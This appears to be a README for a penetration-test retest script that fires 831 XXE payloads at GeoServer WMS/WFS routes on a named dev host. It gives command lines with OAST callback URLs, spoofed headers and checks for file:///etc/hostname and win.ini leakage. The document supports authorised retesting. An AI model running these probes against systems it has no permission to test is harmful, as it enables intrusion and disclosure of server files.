# GeoServer XXE Probe Script Usage

Script:

```text
scripts/geoserver_xxe_probe.py
```

It sends XXE parser checks across common GeoServer service routes and writes:

```text
callback_map.csv   maps each unique OAST callback URL to the exact request
results.jsonl      HTTP status, response size, exception snippets, block markers
raw/*.http         Burp-ready raw requests for every case
```

Default target:

```text
https://amap.dev.airmiles.ai/geoserver
```

## Required Input

You must provide your Burp Collaborator/OAST base URL:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com
```

The script appends unique paths like:

```text
https://YOUR-OAST-ID.oastify.com/wms-0001-wms111-param-dtd
```

So any OAST hit can be matched to `callback_map.csv`.

## Recommended First Run: Dry Run

This writes every raw request without sending traffic:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --dry-run
```

## Run Through Burp

Use this if you want all requests visible in Burp Proxy/Logger:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --proxy http://127.0.0.1:8080 \
  --insecure \
  --delay 0.2
```

## Unauthenticated Run

No auth flags:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --delay 0.2
```

## Authenticated Run

Use only the headers you need:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --x-user "USER_VALUE" \
  --x-credentials "CREDENTIALS_VALUE" \
  --delay 0.2
```

With cookies:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --cookie "GS_FLOW_CONTROL=...; JSESSIONID=..." \
  --x-credentials "CREDENTIALS_VALUE" \
  --delay 0.2
```

With any extra header:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --header "Authorization: Bearer TOKEN" \
  --header "X-Forwarded-For: 127.0.0.1"
```

## Add Real GeoServer Names

If you know the real workspace/layer/typeName, pass them. This makes WMS/WFS tests stronger because requests reach normal service logic.

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --workspace WORKSPACE \
  --layer WORKSPACE:LAYER \
  --typename WORKSPACE:FEATURETYPE \
  --coverage WORKSPACE:COVERAGE
```

If you do not pass these, the script uses sample defaults:

```text
layer=topp:states
typename=topp:states
coverage=nurc:Img_Sample
```

## Service-Specific Runs

WMS only:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --services wms
```

WFS only:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --services wfs \
  --typename WORKSPACE:FEATURETYPE
```

WMS and WFS:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --services wms,wfs \
  --layer WORKSPACE:LAYER \
  --typename WORKSPACE:FEATURETYPE
```

All services:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --services all
```

## Optional Parser Controls

Include `/geoserver/web`, `/geoserver/web/`, and `/geoserver/` control routes:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --include-web-controls
```

Include WFS-T invalid transaction parser checks:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --services wfs \
  --include-wfst
```

Only use `--include-wfst` when state-changing parser checks are allowed by the retest rules.

## Output Interpretation

The script cannot poll Burp Collaborator/OAST. You must check OAST manually.

Fixed signal:

```text
no DNS/HTTP OAST hit
no file content reflected
responses show normal GeoServer/WFS/WMS errors
or responses show entity resolution is disallowed
```

Vulnerable signal:

```text
any OAST DNS/HTTP hit
file:///etc/hostname content reflected
file:///C:/Windows/win.ini content reflected
```

Correlate any hit with:

```text
results/geoserver_xxe_<timestamp>/callback_map.csv
```

## Volume

Default full run generates 831 requests.

Use `--max-cases` for a small smoke test:

```bash
scripts/geoserver_xxe_probe.py \
  --callback-url https://YOUR-OAST-ID.oastify.com \
  --max-cases 20
```
